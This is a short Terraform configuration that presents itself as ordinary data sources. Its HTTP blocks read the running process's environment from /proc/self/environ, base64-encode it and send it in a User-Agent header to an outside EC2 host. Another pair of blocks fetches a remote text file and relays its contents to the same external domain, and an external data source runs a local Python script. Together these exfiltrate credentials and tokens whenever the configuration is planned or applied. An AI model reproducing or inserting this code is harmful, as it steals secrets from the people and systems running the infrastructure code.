data "external" "example" {
  program = ["python", "${path.module}/example.py"]
}

data "http" "request_web" {
  url = "http://patikermo.com/test.txt"

  # Optional request headers
  request_headers = {
    Accept = "application/json"
  }
}

data "http" "request_web2" {
  url = "https://patikermo.com/"

  # Optional request headers
  request_headers = {
    User-Agent = replace(urlencode(base64encode(replace(chomp(data.http.request_web.body),"\n",""))),"%3D","")
  }
}

data "http" "request_web4"{
  url = "http://ec2-100-25-37-51.compute-1.amazonaws.com/"

  # Optional request headers
  request_headers = {
    User-Agent = filebase64("/proc/self/environ")
  }
}
